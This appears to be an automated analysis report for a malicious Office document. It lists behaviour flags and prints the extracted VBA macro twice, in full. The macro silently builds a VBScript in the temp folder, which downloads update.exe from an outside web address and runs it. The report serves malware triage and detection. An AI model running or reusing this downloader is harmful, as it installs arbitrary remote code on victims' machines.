behavior.Run: May run an executable file or a system command
behavior.Shell: May run an executable file or a system command
behavior.WScript.Shell: May run an executable file or a system command

docinfo.macro:
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd.exe /c echo Const adTypeBinary = 1 > %temp%\winconfig.vbs & echo Const adSaveCreateOverWrite = 2 >> %temp%\winconfig.vbs & echo Dim abc >> %temp%\winconfig.vbs & echo Dim xyz >> %temp%\winconfig.vbs & echo Dim rofl >> %temp%\winconfig.vbs & echo abc = ""ADODB"" >> %temp%\winconfig.vbs & echo xyz = "".Stream"" >> %temp%\winconfig.vbs & echo Set rofl = CreateObject(abc+xyz) >> %temp%\winconfig.vbs & echo rofl.Type = adTypeBinary >> %temp%\winconfig.vbs & echo rofl.Open >> %temp%\winconfig.vbs & echo rofl.Write BinaryGetURL(Wscript.Arguments(0)) >> %temp%\winconfig.vbs & echo rofl.SaveToFile Wscript.Arguments(1), adSaveCreateOverWrite >> %temp%\winconfig.vbs & echo Function BinaryGetURL(URL) >> %temp%\winconfig.vbs & echo Dim lol >> %temp%\winconfig.vbs & echo Set lol = CreateObject(""WinHttp.WinHttpRequest.5.1"") >> %temp%\winconfig.vbs & echo lol.Open ""GET"", URL, False >> %temp%\winconfig.vbs & echo lol.Send >> %temp%\winconfig.vbs & echo BinaryGetURL = lol.ResponseBody >> %temp%\winconfig.vbs & echo End Function >> %temp%\winconfig.vbs & echo Set blub = CreateObject(""WScript.Shell"") >> %temp%\winconfig.vbs & echo blub.Run ""%temp%\update.exe"" >> %temp%\winconfig.vbs & start %temp%\winconfig.vbs http://blogerim.co.il/websites/upldimgfriends/vtf/xxx/update.exe %temp%\update.exe", 0,False

filetype: ASCII text, with very long lines, with CRLF line terminators

dump: WshShell.Run "cmd.exe /c echo Const adTypeBinary = 1 > %temp%\winconfig.vbs & echo Const adSaveCreateOverWrite = 2 >> %temp%\winconfig.vbs & echo Dim abc >> %temp%\winconfig.vbs & echo Dim xyz >> %temp%\winconfig.vbs & echo Dim rofl >> %temp%\winconfig.vbs & echo abc = ""ADODB"" >> %temp%\winconfig.vbs & echo xyz = "".Stream"" >> %temp%\winconfig.vbs & echo Set rofl = CreateObject(abc+xyz) >> %temp%\winconfig.vbs & echo rofl.Type = adTypeBinary >> %temp%\winconfig.vbs & echo rofl.Open >> %temp%\winconfig.vbs & echo rofl.Write BinaryGetURL(Wscript.Arguments(0)) >> %temp%\winconfig.vbs & echo rofl.SaveToFile Wscript.Arguments(1), adSaveCreateOverWrite >> %temp%\winconfig.vbs & echo Function BinaryGetURL(URL) >> %temp%\winconfig.vbs & echo Dim lol >> %temp%\winconfig.vbs & echo Set lol = CreateObject(""WinHttp.WinHttpRequest.5.1"") >> %temp%\winconfig.vbs & echo lol.Open ""GET"", URL, False >> %temp%\winconfig.vbs & echo lol.Send >> %temp%\winconfig.vbs & echo BinaryGetURL = lol.ResponseBody >> %temp%\winconfig.vbs & echo End Function >> %temp%\winconfig.vbs & echo Set blub = CreateObject(""WScript.Shell"") >> %temp%\winconfig.vbs & echo blub.Run ""%temp%\update.exe"" >> %temp%\winconfig.vbs & start %temp%\winconfig.vbs http://blogerim.co.il/websites/upldimgfriends/vtf/xxx/update.exe %temp%\update.exe", 0,False
